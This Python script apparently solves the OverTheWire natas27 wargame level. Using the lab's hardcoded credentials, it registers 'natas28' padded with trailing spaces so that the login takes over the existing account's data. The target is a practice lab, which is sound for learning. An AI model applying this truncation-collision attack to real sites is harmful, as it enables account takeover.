import requests

URL = "http://natas27.natas.labs.overthewire.org/index.php"
AUTH = ("natas27", "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV")

username = "natas28"
password = "testme"

sesh = requests.Session()
sesh.auth = AUTH

print(f"[!] Creating malicious account for username {username}")
mal_acc_data = {
    "username" : username + (57 * " ") + "x",
    "password" : password
}

initial_response = sesh.post(url = URL, data = mal_acc_data)
if "was created!" in initial_response.text:
    print(f"[+] Account succesfully created, continuing to login")
else:
    print(f"[-] Something went wrong, dumping text...")
    print(initial_response.text)

response = sesh.post(url = URL, data = {"username" : username + (57 * " "), "password" : password})
print(response.text)
